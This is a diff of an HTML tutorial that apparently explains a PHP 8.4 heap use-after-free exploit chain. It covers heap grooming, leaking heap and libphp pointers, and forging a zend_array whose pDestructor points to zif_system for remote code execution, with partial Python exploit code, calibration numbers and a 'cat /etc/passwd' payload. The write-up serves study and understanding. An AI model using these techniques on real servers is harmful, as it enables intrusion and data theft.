@@ -247,7 +247,8 @@ body {
 <p>If you're new to heap exploitation or want the full experience, just keep scrolling. I wrote this to be read start to finish.</p>
 <hr>
 <h2 id="before-we-start">Before we start</h2>
-<p>There are a few things everyone should keep in mind before we dive in. They'll become particularly useful as we progress through the research. As I mentioned earlier, I want this walkthrough to be accessible to everyone, so I'll take the time to explain even the more fundamental concepts. If you're already familiar with them, feel free to skip ahead!</p>
+<p>Before diving into the vulnerabilities themselves, there are a few fundamental concepts we need to understand.</p>
+<p>(skip if you already know)</p>
 <h3 id="stack-vs-heap">Stack vs. heap</h3>
 <p>In a typical program, memory is organized into different regions, including the stack and the heap.</p>
 <p>For example, in C++:</p>
@@ -676,7 +677,7 @@ f[2][x][x][x][x]...</code></pre>
 <p>to resume : once you know where the heap starts and where <code>libphp</code> is loaded, the randomization doesn't matter anymore. You just add the right offsets and now you know exactly where everything is on that specific run. The shuffle already happened, but now you've seen where the cards landed.</p>
 <p>before we move to the next point remember <code>pDestructor</code>, it also plays an important role in the final stage of the attack</p>
 <p>now how does the attacker actually extract these pointers from a worker's memory?</p>
-<h2 id="request-2-reclaiming-the-memory-and-forging-the-string-">Request #2: Reclaiming the Memory and Forging the String </h2>
+<h2 id="request-2-reclaiming-the-memory-and-forging-the-string">Request #2: Reclaiming the Memory and Forging the String </h2>
 <p>Remember the C++ example where we freed Alice (a), but a_stale still pointed to that memory, and then we allocated Jack (b) in the exact same spot? This is exactly what happens here.</p>
 <p>The attacker sends Request #2, carefully crafted to allocate a specific payload. The Zend Engine’s memory allocator trying to be efficient reuses the recently freed memory chunk from Request #1.</p>
 <p>Now, the stale pointer (our a_stale) and the attacker’s new payload (our b) share the exact same memory address.(Of course, getting the Zend allocator to hand us back the exact same chunk isn't that simple and definitely not luck it requires precise manipulation. Keep reading, and we will see exactly how we manipulate the memory to guarantee this overlap and what the heap looks like while we do it)</p>
@@ -724,10 +725,10 @@ fields.append(mp_field(bnd, b"1999", bytes(forged)))</code></pre>
 <p>Yaah nooo... it's a little more complicated than that (by little I mean a LOT).</p>
 <p>OK so here I want to explain something that is quite complicated and difficult, but I just don't want to do what most of the resources on the internet do , they say those numbers are just calibrations for a specific PHP build, take them as a magic number. No. i will try to show you as an example on how those calibrations change the memory to achieve what we want in PHP 8.4.26 Alpine CLI, and then you'll understand the logic behind every number.</p>
 <h4 id="how-i-investigated-this">How I Investigated This</h4>
-<p>before we dive into the numbers... let me show you how I actually watched all of this , Because understanding the heap isn't something you do by reading docs , you do it by <strong>staring at memory until it makes sense (or you lose your mind)</strong>.</p>
-<p>I ran <code>gdbserver</code> inside a Docker container with the target PHP build . On the host, Ghidra's Debugger connects via GDB remote to inspect memory so I could set breakpoints at <code>zend_mm_alloc</code>, <code>zend_mm_free</code>, <code>php_session_save_current_state</code>..... , and watch every single allocation and free happen.</p>
+<p>before we dive in let me show you how I actually watched all of this (staring at memory until it makes sense or you lose your mind).</p>
+<p>I ran <code>gdbserver</code> inside a Docker container with the target PHP build . On the host, Ghidra's Debugger connects via GDB remote to inspect memory so I could set breakpoints at <code>zend_mm_alloc</code>, <code>zend_mm_free</code>, <code>php_session_save_current_state</code>..... , and watch allocations and deallocations happen.</p>
 <p>I also used GDB in batch mode inside the container to automatically dump 8 KB of heap memory around PS(id) at four critical moments: baseline, after padding, after the resize, and after the forged payload lands. Each dump covers two full pages centered on the stale pointer, so you can see exactly what's happening in the neighborhood.</p>
-<p>Since showing all of this through Ghidra screenshots would take lot of images, I used those dumps to build an interactive visualization website instead. It shows you the full memory chunk around PS(id) at each step, you can click through the stages and see exactly which bytes changed, which slots were freed, and where the forged data landed.</p>
+<p>Since showing all of this through Ghidra screenshots would take lot of images, I used AI and those dumps to build an interactive visualization website instead. It shows you the full memory chunk around PS(id) at each step, you can click through the stages and see exactly which bytes changed, which slots were freed, and where the forged data landed.</p>
 <p>All the raw heap dumps are available in the <code>dumps/</code> folder in the GitHub repo. You can load them into Ghidra or any hex editor at the PS(id) base address shown in the visualization (it changes between runs due to ASLR, but the offsets are the same).</p>
 <p>check the heap_memory_map.html file inside the github repo</p>
 <p>OK now let's get into the actual heap internals.</p>
@@ -778,7 +779,7 @@ For the stale pointer with ~32 chars: 24 + 32 + 1 = 57 bytes → rounded up to 6
 |  this later                                              |
 └──────────────────────────────────────────────────────────┘</code></pre>
 <h4 id="why-direct-replacement-doesnt-work">Why Direct Replacement Doesn't Work</h4>
-<p>Now here's the thing that trips everyone up. You might be thinking: "Why can't we just send the forged data with the exact same size as the stale pointer? It would go into bin 7 (64 bytes), the allocator would pop the stale pointer's old slot from the freelist, and our forged data lands right there. Done!"</p>
+<p>"Why can't we just send the forged data with the exact same size as the stale pointer? It would go into bin 7 (64 bytes), the allocator would pop the stale pointer's old slot from the freelist, and our forged data lands right there. Done"</p>
 <p>Here's the problem. When Request #1 crashes (OOM → bailout → <code>longjmp()</code>), PHP calls <code>zend_mm_shutdown()</code> which <strong>frees the entire chunk</strong>. Everything gets reset — all bins are emptied, all freelists cleared, the Wilderness frontier goes back to the beginning. It's like the whole 2 MiB block is wiped clean.</p>
 <p><img src="images/final_image2.png" alt="GDB showing zend_mm_shutdown with dangling pointer PS(id) after heap free" loading="lazy"> > <strong>Phase 2: </strong> GDB showing <code>zend_mm_shutdown()</code> PS(id) still = <code>0x7f08e1874000</code>, memory still contains the session ID bytes, but after this function returns the entire heap is freed and PS(id) becomes a <strong>dangling pointer</strong>.</p>
 <p>But here's what doesn't change: the <strong>physical memory</strong> at those addresses still exists, and the OS gives the same 2 MiB block right back to Request #2. The stale pointer is still pointing at the same address deep inside the chunk, at page 116 (in my GDB run, that was address <code>0x7f08e1874000</code>).</p>
@@ -807,7 +808,7 @@ For the stale pointer with ~32 chars: 24 + 32 + 1 = 57 bytes → rounded up to 6
  51          still 64 slots        No resize needed at this count (51/64)</code></pre>
 <p>Each resize allocates a bigger arData array and frees the old one, each landing in its own bin, eating even more Wilderness pages on top of the bin 3 and bin 8 allocations. It all adds up: keys in bin 3, values in bin 8, HashTable arData arrays in their own bins, internal PHP allocations... all pushing the frontier forward page after page.</p>
 <p><strong>51 padding fields is exactly the number that pushes bin 8's page frontier to page 116</strong> (the page where the stale pointer lives).</p>
-<p>Now here comes the part that blew my mind when I first saw it in the memory dumps. Look at what's sitting at stale pointer position after all 51 fields are parsed:</p>
+<p>Look at what's sitting at stale pointer position after all 51 fields are parsed:</p>
 <pre><code>After 51 padding fields memory at PS(id) (page 116):
 
   PS(id)+0x00: 01 00 00 00 16 00 00 00   ← gc (refcount=1, type=string)
@@ -830,10 +831,10 @@ New value (128 × 'Z'):  128 bytes → zend_string: 153B → Bin 12 (160B) → A
 <pre><code>After resize — memory at PS(id) (page 116):
 
   PS(id)+0x00: a0 3f e7 47 fe 7e 00 00   ← FREELIST POINTER (gc stomped!)
-  PS(id)+0x08: 00 00 00 00 00 00 00 00   ← old hash — untouched
-  PS(id)+0x10: 30 00 00 00 00 00 00 00   ← old len=48 — untouched
-  PS(id)+0x18: 76 30 30 35 30 78 78 78   ← old val[] "v0050xxx" — untouched</code></pre>
-<p>And here's the key insight: the page <strong>stays as bin 8</strong>. The slot at PS(id) goes back onto the bin 8 freelist, waiting for the next bin 8 allocation to pop it. The page itself doesn't change its bin assignment just because one slot was freed. This is important because the forged data will land in this exact same bin 8 slot.</p>
+  PS(id)+0x08: 00 00 00 00 00 00 00 00   ← old hash  untouched
+  PS(id)+0x10: 30 00 00 00 00 00 00 00   ← old len=48 untouched
+  PS(id)+0x18: 76 30 30 35 30 78 78 78   ← old val[] "v0050xxx" untouched</code></pre>
+<p>the page <strong>stays as bin 8</strong>. The slot at PS(id) goes back onto the bin 8 freelist, waiting for the next bin 8 allocation to pop it. The page itself doesn't change its bin assignment just because one slot was freed. This is important because the forged data will land in this exact same bin 8 slot.</p>
 <p>The new 128 byte Z value goes into bin 12 (160B), which goes to another page nowhere near page 116. That's why we don't see where the Z bytes went... you won't find them anywhere in the dumps. Not a single <code>0x5A</code> in the entire 8 KB window around PS(id). The Z data landed on a completely different page. Its only job was to free the slot at PS(id) by replacing the old value.</p>
 <p>The slot is freed. The trap is set.</p>
 <h4 id="the-forged-value-lands-and-the-mystery-that-almost-broke-my-mind">The Forged Value Lands (And the Mystery That Almost Broke my mind)</h4>
@@ -849,7 +850,8 @@ New value (128 × 'Z'):  128 bytes → zend_string: 153B → Bin 12 (160B) → A
 </ul>
 <p>Nothing worked. I could SEE the forged data in the dumps, I could PROVE it was there, but I couldn't figure out WHAT put it there.</p>
 <p>So I built a <strong>debug version of PHP 8.4.26</strong> from source with <code>--enable-debug</code>. Debug builds keep <code>emalloc()</code> as a real function call, keep <code>memcpy()</code> as a real function call, and most importantly have full debug symbols so backtraces show you the actual file and line number. The catch is that debug builds add overhead to every allocation (guard bytes, canaries, tracking headers) which changes the sizes and bin assignments, so the exploit doesn't groom the same way and the forged data doesn't actually reach PS(id). But that's fine because I didn't need the exploit to work, I just needed to READ THE SOURCE CODE that the debug build gave me access to.</p>
-<p>And there it was. Hiding in plain sight. <strong><code>multipart_buffer_read_body()</code></strong> in <code>main/rfc1867.c</code> line 632:</p>
+<p>And there it was:
+ <strong><code>multipart_buffer_read_body()</code></strong> in <code>main/rfc1867.c</code> line 632:</p>
 <pre data-lang="c"><code class="language-c">static char *multipart_buffer_read_body(multipart_buffer *self, size_t *len)
 {
     char buf[FILLUNIT], *out=NULL;
@@ -871,7 +873,7 @@ New value (128 × 'Z'):  128 bytes → zend_string: 153B → Bin 12 (160B) → A
 <pre><code>erealloc(NULL, 0 + 79 + 1) = emalloc(80)
                                        └── 80 bytes = EXACTLY bin 8</code></pre>
 <p>79 bytes of forged data + 1 null terminator = <strong>80 bytes = bin 8</strong>. EXACTLY bin 8. Not bin 10, not bin 15. The raw body reader allocates a temporary buffer that is the EXACT size of a bin 8 slot.</p>
-<p>The mystery was solved. Here's the full sequence of what happens when field "1999" is processed:</p>
+<p>its finally solved Here's the full sequence of what happens when field "1999" is processed:</p>
 <ul>
 <li><code>multipart_buffer_read_body()</code> reads the 79 forged bytes from the HTTP body</li>
 <li><code>erealloc(NULL, 80)</code> → <code>emalloc(80)</code> → pops the freed slot at PS(id) from the bin 8 freelist</li>
@@ -882,7 +884,7 @@ New value (128 × 'Z'):  128 bytes → zend_string: 153B → Bin 12 (160B) → A
 <li>The forged bytes at +0x08 through +0x47 <strong>survive</strong></li>
 </ul>
 <p>And the reason this was invisible in the release build?? In optimized builds, the compiler inlines <code>erealloc(NULL, 80)</code> into direct bin 8 freelist pointer manipulation (a few <code>mov</code> instructions, no function call) and inlines <code>memcpy(out, buf, 79)</code> into a series of <code>rep movsb</code> or register moves. There is literally no function boundary for GDB to break on. The allocation and the copy are just anonymous instructions buried in the middle of a 1588 line disassembly of <code>rfc1867_post_handler</code>. That's why the <code>_emalloc</code> breakpoint missed it (never called as a function), the <code>memcpy</code> breakpoint missed it (never called as a function), and only the hardware watchpoint caught the RESULT but couldn't tell us WHERE in the code it came from.</p>
-<p>So there you go. The forged data reaches PS(id) not through <code>smart_string</code>, not through <code>ZVAL_STRINGL</code>, but through the simplest possible code path: a temporary <code>erealloc</code> buffer in the raw multipart body reader. 79+1 = 80 = bin 8. Perfect fit.</p>
+<p>So in the end The forged data reaches PS(id) not through <code>smart_string</code>, not through <code>ZVAL_STRINGL</code>, but through a temporary <code>erealloc</code> buffer in the raw multipart body reader. 79+1 = 80 = bin 8. Perfect fit.</p>
 <p>Here's what matters: the 79 forged bytes overwrite the entire bin 8 slot at PS(id). Remember that PS(id) is a <code>zend_string*</code>, so PHP interprets the memory at PS(id) as a <code>zend_string</code> struct:</p>
 <pre><code>Forged data overwrites the zend_string at PS(id):
 
@@ -922,14 +924,14 @@ New value (128 × 'Z'):  128 bytes → zend_string: 153B → Bin 12 (160B) → A
 </ul>
 <p>So PHP happily reads 256 bytes starting from <code>val[]</code>, scooping up neighboring heap data pointers, struct headers, everything and sends it all back in the <code>Set-Cookie</code> header.</p>
 <p><strong>THAT is the heap leak.</strong></p>
-<h4 id="the-parking-garage-analogy-to-understand-better">The Parking Garage Analogy (to understand better)</h4>
-<p>Imagine a parking garage with 512 floors. The stale pointer is parked on floor 116. After the building is "reset" (all floors unmarked), different vehicle types (bins) start claiming floors from the bottom:</p>
+<h4 id="to-understand-better-simplified">to understand better(simplified)</h4>
+<p>Imagine the memory as 512 floors. The stale pointer is parked on floor 116. After the building is "reset" (all floors unmarked), different bins start claiming floors from the bottom:</p>
 <ul>
-<li>Compact cars (<strong>bin 3</strong>, 32B) take some floors</li>
-<li>SUVs (<strong>bin 8</strong>, 80B) take other floors</li>
-<li>Minivans (HashTable arData arrays) take even more floors</li>
+<li>(bin 3, 32B) take some floors</li>
+<li>(bin 8, 80B) take other floors</li>
+<li>(HashTable arData arrays) take even more floors</li>
 </ul>
-<p>You keep sending SUVs until they claim floor 116 and one parks right at the stale pointer's spot. Then you tell that SUV to leave (the resize frees its slot). The floor stays marked as "SUV parking" (bin 8) but that specific spot is now empty and back on the waiting list. Then during the processing of the forged field, <code>multipart_buffer_read_body()</code> needs a temporary buffer of exactly 80 bytes (79 forged bytes + 1 null terminator), which is exactly SUV sized. It grabs that same spot from the waiting list, fills it with your forged data, then leaves again when <code>efree(value)</code> is called. The spot goes back to the waiting list with a "next in line" tag stamped over the first 8 bytes, but the forged data you wrote in the middle of the spot is still sitting there untouched. When the stale pointer comes back to check its old spot?? It reads your forged data.</p>
+<p>You keep sending bin 8 until they claim floor 116 and one parks right at the stale pointer's spot. Then the resize frees its slot. The floor stays marked as "bin 8 parking"  but that specific spot is now empty and back on the waiting list. Then during the processing of the forged field, <code>multipart_buffer_read_body()</code> needs a temporary buffer of exactly 80 bytes (79 forged bytes + 1 null terminator), which is exactly bin 8 sized. It grabs that same spot from the waiting list, and our forged data is put there, then freed again when <code>efree(value)</code> is called. The spot goes back to the waiting list with a "next in line" tag stamped over  the first 8 bytes, but the forged data you wrote in the middle of the rest of the spot is still sitting there untouched. When the stale pointer comes back to check its old spot?? It reads your forged data.</p>
 <p>Here's the full lifecycle of the page at PS(id). The page changes bin assignment once (from 7 to 8 during the shutdown/startup cycle), and then stays bin 8 for the rest of the exploit:</p>
 <pre><code>Step 0:  Page = Bin 7 (64B)    original session ID zend_string lives here
               ↓
@@ -1015,7 +1017,7 @@ OOMShape(depth=57, count=950, field_count=50, field_value_size=1)
 OOMShape(depth=58, count=935, field_count=65, field_value_size=39)</code></pre>
 <p>See the differences? The code leak uses deeper nesting (58 vs 57), fewer nested fields (935 vs 950), more padding fields (65 vs 50), and bigger padding values (39 bytes vs 1 byte). Every single one of those numbers changes how much memory gets consumed, which pages end up allocated, and most importantly where the stale pointer ends up sitting relative to what the consumer can reach, but in the end the logic is the same.</p>
 <h3 id="real-practice-leaking-the-code-pointer-stage-3">Real practice: leaking the code pointer (Stage 3)</h3>
-<p>We already went through the heap leak consumer in extreme detail. Now let's look at the code leak consumer, which has a completely different strategy (Stick with me to the end of this one, because the way we force the system to create this leak for us is absolutely brilliant):</p>
+<p>We already went through the heap leak consumer in extreme detail. Now let's look at the code leak consumer, which has a completely different strategy (the way we force the system to create this leak for us is brilliant):</p>
 <pre data-lang="python"><code class="language-python">def code_reclaim() -&gt; bytes:
     bnd = COOKIE_BOUNDARY
     fields = [mp_field(bnd, b"PHPSESSID", b"a"),
@@ -1085,7 +1087,7 @@ VALUE (24 bytes of 'P')
 <p>So if the attacker gets a pointer like <code>0x7f3a12512930</code>, they check: does <code>0x7f3a12512930 & 0x1FFFFF</code> equal <code>0x112930</code>? YES! now think about where we are: we are looking inside a zend_array struct right??, we know for a fact it has a pDestructor pointer, and the math perfectly matches the zval_ptr_dtor signature. That means this pointer is practically guaranteed to be the exact function we need.</p>
 <p>If the low bits don't match, it means either the cookie contains garbage OR the server is running a different PHP build. Either way, the script knows to stop right here instead of blindly sending a forged payload that will crash the worker.</p>
 <h3 id="parsing-the-heap-leak-finding-the-chunk-base-in-256-bytes-of-chaos">Parsing the heap leak: finding the chunk base in 256 bytes of chaos</h3>
-<p>While we're talking about parsing leaked cookies, let's also look at how the heap stage validates its 256-byte cookie. Because 256 bytes of raw heap memory is NOT a clean, labeled structure. It's a mess of overlapping structs, old data, freelist pointers, and random garbage. How do you find a real heap pointer in all that noise?</p>
+<p> Because 256 bytes of raw heap memory is NOT a clean, labeled structure. It's a mess of overlapping structs, old data, freelist pointers, and random garbage. How do you find a real heap pointer in all that noise?</p>
 <pre data-lang="python"><code class="language-python">def parse_heap_leak(cookie: bytes) -&gt; int | None:
     if len(cookie) != 256:
         return None
@@ -1102,9 +1104,8 @@ VALUE (24 bytes of 'P')
         return None
     hits, _alignment, base = max(candidates)
     return base if hits &gt;= MIN_POINTER_AGREEMENT else None</code></pre>
-<p>The idea is clever: scan every possible 8-byte aligned position in the 256-byte blob. For each 8-byte value, check if it looks like a heap pointer (falls in the <code>0x700000000000</code> to <code>0x800000000000</code> range). Then mask off the low 21 bits (<code>& ~0x1FFFFF</code>) to get the chunk base.</p>
-<p>If multiple pointers in the blob all agree on the <strong>same</strong> chunk base (at least 4 of them <code>MIN_POINTER_AGREEMENT</code>), that's a real leak. Why? Because a single heap chunk is 2 MiB and all allocations within it share the same base. If 4+ different pointers in the leaked memory all point into the same 2 MiB chunk, there's basically no way that's a coincidence.</p>
-<p>Random ASCII bytes that accidentally look like valid pointers? Sure, one might slip through. But four of them all agreeing on the same aligned base? That's your real heap address.</p>
+<p>The idea is simple: scan every possible 8-byte aligned position in the 256-byte blob. For each 8-byte value, check if it looks like a heap pointer (falls in the <code>0x700000000000</code> to <code>0x800000000000</code> range). Then mask off the low 21 bits (<code>& ~0x1FFFFF</code>) to get the chunk base.</p>
+<p>If multiple pointers in the blob all agree on the <strong>same</strong> chunk base (at least 4 of them <code>MIN_POINTER_AGREEMENT</code>), that's a real leak. Why? there may be random ASCII bytes that accidentally look like valid pointers, But four of them all agreeing on the same aligned base? That's your real heap address.</p>
 <h3 id="the-18-pipeline-how-both-leaks-are-actually-delivered">The 1+8 pipeline: how both leaks are actually delivered</h3>
 <p>One more thing we need to cover before moving on. We talked about HTTP pipelining earlier as a way to solve the worker roulette problem. But I showed you the concept without showing the actual implementation. In reality, each leak stage sends <strong>nine HTTP requests in a single TCP write</strong>:</p>
 <pre><code>┌────────────────────────────────────────────────────────────────┐
@@ -1121,23 +1122,22 @@ VALUE (24 bytes of 'P')
 │  Request 9: CONSUMER (leak attempt)    ← Connection: close     │
 │                                                                │
 └────────────────────────────────────────────────────────────────┘</code></pre>
-<img src="images/producer_Consumers.jpg" width ="400" align="right" >
-<p>All nine requests are written to the socket <strong>before reading any responses</strong>. This is critical. If the attacker waited for the producer's response before sending consumers, there's a window where another user's request could steal the poisoned worker. By sending everything in one shot, the server's TCP stack buffers all nine requests, and the worker processes them back-to-back with no gap.</p>
-<p>Why 8 consumers and not just 1? Simply to maximize our chances of hitting the exact worker that holds the stale pointer. Pipelining pushes all nine requests down one TCP connection, but depending on the server's architecture, there's no hard guarantee every single one lands on the same backend worker. Sending 8 consumers means 8 opportunities for one of them to reach that poisoned worker and extract the leak.</p>
+<p>All nine requests are written to the socket <strong>before reading any responses</strong>. This is critical. If the attacker waited for the producer's response before sending consumers, there's a window where another user's request could steal the poisoned worker.</p>
+<p>Why 8 consumers and not just 1? Simply to maximize our chances of hitting the exact worker that holds the stale pointer. Pipelining pushes all nine requests down one TCP connection, but depending on the server's architecture, there's no hard guarantee every single one lands on the same backend worker.</p>
 <p>The producer also carries something weird in its HTTP headers: <strong>1001 empty cookie pairs</strong>.</p>
 <pre data-lang="python"><code class="language-python">COOKIE_PAIRS = 1001
 
 # In the HTTP header:
 Cookie: 00=;01=;02=;03=;04=;05=;...zz=;</code></pre>
-<p>Why?? Because PHP has to parse every single cookie name and allocate memory for it. These 1001 empty cookies are another form of heap grooming they consume specific bin sizes during header parsing, pushing the allocator's state into a position where the session ID string ends up on the right page. Remember, EVERYTHING is calibration. Even the HTTP headers are part of the exploit.</p>
+<p>Why?? Because PHP has to parse every single cookie name and allocate memory for it. These 1001 empty cookies are another form of heap grooming they consume specific bin sizes during header parsing, pushing the allocator's state into a position where the session ID string ends up on the right place. Remember, EVERYTHING is calibration. Even the HTTP headers are part of the exploit.</p>
 <h3 id="three-connections-not-one">Three connections, not one</h3>
 <p>We mentioned this briefly earlier, but because it was fast, it's really easy to get it wrong: the entire exploit is NOT packed into a single mega pipeline or one giant request. The three stages actually use three separate TCP connections:</p>
 <pre><code>Connection 1:  [heap producer] + [8 heap consumers]     → heap chunk base
 Connection 2:  [code producer] + [8 code consumers]     → zval_ptr_dtor
 Connection 3:  [final callback single request]         → RCE</code></pre>
-<p>Each <code>target.connect()</code> in the code opens a brand new socket. Within a leak stage, the producer and its 8 consumers MUST reach the same worker , that's the whole point of pipelining them together. But between stages? Completely separate connections. The heap leak, code leak, and final callback can each land on different workers.</p>
-<p>Now you might be thinking: "Hold on... if they hit different workers, how do the leaked addresses still work? Doesn't ASLR randomize each process independently?"</p>
-<p>The answer comes from how PHP Alpine CLI's multi-worker mode creates its workers: <code>fork()</code>. The master process loads <code>libphp.so</code>, sets up the runtime, and then forks child workers. When <code>fork()</code> happens, every child inherits the <strong>exact same virtual memory layout</strong> from the parent. That means the <strong>code base address is identical across all workers</strong>, <code>zval_ptr_dtor</code> sits at the same address in Worker A, Worker B, Worker C, and Worker D. So a code pointer leaked from one worker works perfectly for any other worker in the same pool.</p>
+<p>Within a leak stage, the producer and its 8 consumers MUST reach the same worker, But between stages? Completely separate connections. The heap leak, code leak, and final callback can each land on different workers.</p>
+<p>"Hold on... if they hit different workers, how do the leaked addresses still work? </p>
+<p>The answer comes from how PHP Alpine CLI's multi-worker mode creates its workers: <code>fork()</code>. The master process loads <code>libphp.so</code>, sets up the runtime, and then forks child workers. When <code>fork()</code> happens, every child inherits the <strong>exact same virtual memory layout</strong> from the parent. That means the <strong>code base address is identical across all workers</strong>, So a code pointer leaked from one worker works perfectly for any other worker.</p>
 <p>The heap is a different story. Each worker allocates its own Zend MM chunks independently after the fork. But the allocation pattern is deterministic enough that the calibration constants (<code>HEAP_CARRIER_DELTA</code> and <code>HEAP_CARRIER_OFFSET</code>) hold across workers. Same binary, same startup sequence, same request shape = same heap layout.</p>
 <p>On a noisy production server with hundreds of workers and unpredictable traffic? Those heap offsets would be much less reliable. That's one more reason why this exploit is hard to pull off in the wild but on a quiet CTF target, it works.</p>
 <h2 id="reusing-the-allocator-to-forge-a-structure">Reusing the allocator to forge a structure:</h2>
@@ -1147,11 +1147,9 @@ Connection 3:  [final callback single request]         → RCE</code></pre>
 <p>Why a <code>zend_array</code>? </p>
 <p>to answer this try to remember this sentence: </p>
 <p>"They can't truly force PHP to execute arbitrary commands... well, unless they can overwrite something the PHP engine blindly trusts and calls." it was not picked randomly... </p>
-<p><strong>You see where this is going?</strong></p>
-<p>unlike standard objects that require a separate, secondary vtable structure to hold their function pointers, a <code>zend_array</code> holds its cleanup function pointer (<code>pDestructor</code>) directly inside its own struct. It's an all-in-one package for hijacking execution.</p>
-<p>Thanks to the addresses leaked (defeating ASLR), the attacker knows exactly where the heap is and where the libphp executable functions are located. They can construct fake data that looks perfectly valid to PHP.....what fake data?? and why pDestructor ?? read what comes next..</p>
+<p>unlike standard objects that require a separate, vtable structure to hold their function pointers, a <code>zend_array</code> holds its cleanup function pointer (<code>pDestructor</code>) directly inside its own struct.</p>
+<p>Thanks to the addresses leaked (defeating ASLR), the attacker knows exactly where the heap is and where the libphp executable functions are located. They can construct fake data that looks perfectly valid to PHP</p>
 <h3 id="the-idea-overwrite-pdestructor">The idea: overwrite pDestructor</h3>
-<p>as we said php runs what pDestructor points to free data right ?? freeing data is something that happens eventually always in the end and its something that php executes blindly trusting the function that pointer points to.... if an attacker can overwrite that <code>pDestructor</code> pointer, they can redirect the execution flow. And without the attacker triggering any method manually. The engine itself invokes it during normal operations.</p>
 <p>Normally PDestructor points to a safe function like <code>zval_ptr_dtor</code>. But what if we could overwrite that pointer with the address of <code>zif_system</code> instead??</p>
 <p>That's the entire idea. We forge a fake <code>zend_array</code> where <code>pDestructor</code> doesn't point to a safe cleanup function anymore. It points to PHP's wrapper for the C <code>system()</code> function. When PHP goes to "clean up" this array, it blindly trusts the pointer, jumps to it, and executes whatever command we put in there.</p>
 <h3 id="the-forged-structure">The forged structure</h3>
@@ -1174,24 +1172,23 @@ struct ForgedArray {
     // Immediately following or referenced by the array is our payload string:
     char command[56];       // Payload: "cat /etc/passwd"
 };</code></pre>
-<p>Simple right?? Well... not exactly. That was the simplified version. In reality the attacker forges three different structures overlapping in the exact same memory space. But we'll get to that in a moment. For now just understand: the attacker builds raw bytes that look like a valid <code>zend_array</code> to PHP, but with <code>pDestructor</code> secretly pointing to <code>zif_system</code>.</p>
+<p>this is a simplified version. In reality the attacker forges three different structures overlapping in the exact same memory space. But we'll get to that in a moment. For now just understand: the attacker builds raw bytes that look like a valid <code>zend_array</code> to PHP, but with <code>pDestructor</code> secretly pointing to <code>zif_system</code>.</p>
 <h3 id="but-wait-how-does-php-even-run-our-pointer">But wait... how does PHP even run our pointer?</h3>
 <p>OK so we have a forged structure with a poisoned <code>pDestructor</code>. But there are two questions we need to answer before any of this works:</p>
 <p><strong>Question 1: Won't PHP just construct the array properly and write its own safe pDestructor??</strong></p>
-<p>No. And here is the secret: PHP doesn't "write its own pointer" here because we aren't writing normal PHP code that asks the engine to create a clean, safe array.</p>
-<p>When you write normal PHP code like <code>$arr = [];</code>, PHP builds the array safely and sets <code>pDestructor</code> to <code>zval_ptr_dtor</code>. But in our attack, we are bypassing the PHP language interpreter entirely. We are sending a raw HTTP request where the body contains our custom crafted byte pattern. PHP's multipart parser takes those raw bytes straight off the wire and dumps them directly into a heap allocation. PHP has no idea that the bytes represent a <code>zend_array</code>. To PHP, it's just opaque data from a form field. Our raw bytes, including our hardcoded <code>zif_system</code> address written right into the <code>pDestructor</code> slot, are copied directly into the heap without any validation.</p>
+<p>No.we aren't writing normal PHP code that asks the engine to create a clean, safe array.</p>
+<p>When you write normal PHP code like <code>$arr = [];</code>, PHP builds the array safely and sets <code>pDestructor</code> to <code>zval_ptr_dtor</code>. But in our attack, we are bypassing the PHP language interpreter entirely. We are sending a raw HTTP request where the body contains our custom crafted byte pattern. PHP's multipart parser takes those raw bytes straight off the wire and dumps them directly into a heap allocation. PHP has no idea that the bytes represent a <code>zend_array</code>.they are copied directly into the heap without any validation.</p>
 <p><strong>Question 2: OK the forged table is on the heap. But how does PHP find it??</strong></p>
 <p>PHP won't magically stumble upon our fake array on its own. So the attacker needs to do two things:</p>
-<p>First, they need to know WHERE the forged table will land. And they do, because they leaked the heap base in Stage 1. ASLR is defeated. From that heap base, the offset to where a specific allocation will end up is deterministic for a given build. The attacker can predict: "if I send a field with this exact size at this exact moment in the request, its value will land at address X."</p>
+<p>First, they need to know WHERE the forged table will land. And because they leaked the heap base, the offset to where a specific allocation will end up is deterministic. The attacker can predict: "if I send a field with this exact size at this exact moment in the request, its value will land at address X."</p>
 <p>Second, they need to make PHP actually GO to that address during cleanup. So the attacker plants a raw pointer to the forged table inside another field (a "primer") that PHP's cleanup routines will walk through during the OOM teardown. It's basically a trail of breadcrumbs. During the cleanup, PHP reads that pointer from the primer, thinks: "Ah, I need to clean up the array located at this address," follows it, arrives at the forged HashTable, and treats it like legitimate data.</p>
 <p>We'll see exactly how this pointer planting works when we get to the real practice section for Stage 4.</p>
 <p>In short: PHP isn't constructing anything here. We constructed the raw bytes, placed them at a precise, predictable heap address, and left a trail of breadcrumbs (the primer pointer) leading PHP right into our trap. That's the fundamental idea behind structure forgery: PHP expects valid metadata, but the memory it trusts now contains a trap....</p>
 <h2 id="the-trigger-php-does-the-dirty-work-here">The trigger: PHP does the dirty work Here</h2>
 <p>We are going to start this part with the ultimate twist we found earlier: the attacker doesn't need to actively trigger the exploit command themselves. PHP does it for them.</p>
 <p>So what actually happens when PHP follows those breadcrumbs and reaches our forged HashTable??</p>
-<p>At the end of a request, or when an OOM bailout fires, PHP has to clean up after itself. Part of that cleanup process involves destroying data structures that are no longer needed. During that destruction, PHP walks through pointers it finds in the parsed request data and tries to clean up whatever they point to. If one of those pointers has been planted by the attacker to point at the forged HashTable sitting on the heap... PHP walks right into the trap and tries to destroy it like a normal array.</p>
-<p>When PHP goes to destroy a <code>zend_array</code>, it looks at the <code>pDestructor</code> field to know how to clean up the array's contents. Normally, as we saw earlier, this points to a safe function like <code>zval_ptr_dtor</code>.</p>
-<p>But PHP doesn't check if the <code>pDestructor</code> pointer is legitimate. It doesn't check if it still points to <code>zval_ptr_dtor</code>. It just blindly trusts the pointer sitting at that exact memory offset and jumps to it. </p>
+<p>At the end of a request, or when an OOM bailout fires, PHP destroys data structures that are no longer needed by walking through pointers it kept, and trying to clean up whatever they point to. If one of those pointers has been planted by the attacker to point at the forged HashTable sitting on the heap... PHP walks right into the trap and tries to destroy it like a normal array.</p>
+<p>When PHP goes to destroy a <code>zend_array</code>, it looks at the <code>pDestructor</code> field but never validates it,It doesn't check whether it still points to <code>zval_ptr_dtor</code>. It reads the pointer and just blindly jumps to it.</p>
 <p>This is the actual code from <code>zend_hash_destroy()</code> in <strong>php-src/Zend/zend_hash.c</strong> (hash/mixed array path, which is the path our forged table takes):</p>
 <pre data-lang="c"><code class="language-c">Bucket *p = ht-&gt;arData;
 Bucket *end = p + ht-&gt;nNumUsed;
@@ -1208,24 +1205,18 @@ if (ht-&gt;pDestructor) {
     }
     // ... other branches for non-static keys / arrays with holes ...
 }</code></pre>
